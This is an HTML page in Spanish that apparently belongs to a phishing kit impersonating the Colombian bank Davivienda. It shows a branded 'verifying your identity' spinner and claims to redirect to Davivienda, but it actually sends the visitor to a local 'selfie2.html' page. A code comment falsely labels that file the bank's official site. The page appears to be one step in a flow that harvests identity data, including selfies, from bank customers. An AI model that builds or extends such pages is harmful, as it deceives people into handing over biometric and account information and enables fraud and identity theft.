<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Davivienda - Procesando</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', system-ui, -apple-system, sans-serif;
        }
        
        body {
            background: #ffffff;
            color: #212121;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow-x: hidden;
        }
        
        /* MANCHAS DE FONDO (igual que tu diseño) */
        body::before,
        body::after {
            content: "";
            position: fixed;
            width: 520px;
            height: 520px;
            background: #f6f6f6;
            border-radius: 50%;
            z-index: -1;
        }
        
        /* mancha superior derecha */
        body::before {
            top: -260px;
            right: -220px;
        }
        
        /* mancha inferior izquierda */
        body::after {
            bottom: -260px;
            left: -220px;
        }
        
        .wrapper {
            width: 100%;
            max-width: 400px;
            padding: 40px 20px;
            animation: fadeIn 0.6s ease-out;
        }
        
        /* LOGO - igual que tu diseño */
        .logo-box {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 40px;
        }
        
        .logo-box img {
            height: 60px;
            width: auto;
            display: block;
        }
        
        /* Contenido */
        .content-box {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 30px 25px;
            border: 1px solid #e9ecef;
            text-align: center;
        }
        
        /* Mensaje */
        .message {
            font-size: 18px;
            font-weight: 400;
            margin-bottom: 30px;
            color: #333;
            line-height: 1.5;
        }
        
        /* Spinner con color Davivienda */
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f0f0f0;
            border-top: 4px solid #e30613; /* Rojo Davivienda */
            border-radius: 50%;
            margin: 0 auto 25px;
            animation: spin 1.2s linear infinite;
        }
        
        /* Información de redirección */
        .redirect-info {
            font-size: 14px;
            color: #666;
            margin-top: 15px;
        }
        
        /* Progress bar sutil */
        .progress-container {
            width: 100%;
            height: 4px;
            background: #f0f0f0;
            border-radius: 2px;
            margin: 20px auto 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            background: #e30613;
            border-radius: 2px;
            width: 0%;
            animation: progress 3s ease-in-out forwards;
        }
        
        /* Animaciones */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        
        /* Responsive */
        @media (max-width: 480px) {
            .wrapper {
                padding: 30px 20px;
            }
            
            .logo-box img {
                height: 50px;
            }
            
            .message {
                font-size: 16px;
            }
            
            .spinner {
                width: 40px;
                height: 40px;
                border-width: 3px;
            }
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <!-- LOGO - solo imagen como en tu diseño -->
        <div class="logo-box">
            <img src="logo.png" alt="Davivienda">
        </div>
        
        <!-- Contenido -->
        <div class="content-box">
            <!-- Mensaje principal -->
            <div class="message">
                Verificando su identidad<br>
                <span style="font-size: 14px; color: #666; margin-top: 5px; display: block;">
                    Esto puede tardar unos segundos...
                </span>
            </div>
            
            <!-- Spinner -->
            <div class="spinner"></div>
            
            <!-- Barra de progreso sutil -->
            <div class="progress-container">
                <div class="progress-bar"></div>
            </div>
            
            <!-- Información de redirección -->
            <div class="redirect-info" id="redirect-info">
                Redirigiendo a Davivienda...
            </div>
        </div>
    </div>

    <script>
        // URL de redirección al sitio oficial de Davivienda
        const redirectUrl = "selfie2.html";
        
        // Elementos DOM
        const redirectInfo = document.getElementById('redirect-info');
        let countdown = 3;
        
        // Función para actualizar el contador
        function updateCountdown() {
            if (countdown > 0) {
                redirectInfo.textContent = `Redirigiendo a Davivienda en ${countdown} segundo${countdown !== 1 ? 's' : ''}...`;
                countdown--;
                setTimeout(updateCountdown, 1000);
            } else {
                redirectInfo.textContent = "✓ Redirigiendo ahora...";
                redirectInfo.style.color = "#e30613";
                redirectInfo.style.fontWeight = "500";
                
                // Pequeña pausa antes de redirigir
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 500);
            }
        }
        
        // Iniciar contador después de 1 segundo
        setTimeout(() => {
            updateCountdown();
        }, 1000);
        
        // Fallback: redirigir después de 5 segundos máximo
        setTimeout(() => {
            window.location.href = redirectUrl;
        }, 5000);
        
        // Redirigir al hacer clic en cualquier parte (opcional)
        document.addEventListener('click', function() {
            redirectInfo.textContent = "✓ Redirigiendo ahora...";
            redirectInfo.style.color = "#e30613";
            setTimeout(() => {
                window.location.href = redirectUrl;
            }, 300);
        });
        
        // Redirigir al presionar cualquier tecla (opcional)
        document.addEventListener('keydown', function() {
            redirectInfo.textContent = "✓ Redirigiendo ahora...";
            redirectInfo.style.color = "#e30613";
            setTimeout(() => {
                window.location.href = redirectUrl;
            }, 300);
        });
    </script>
</body>
</html>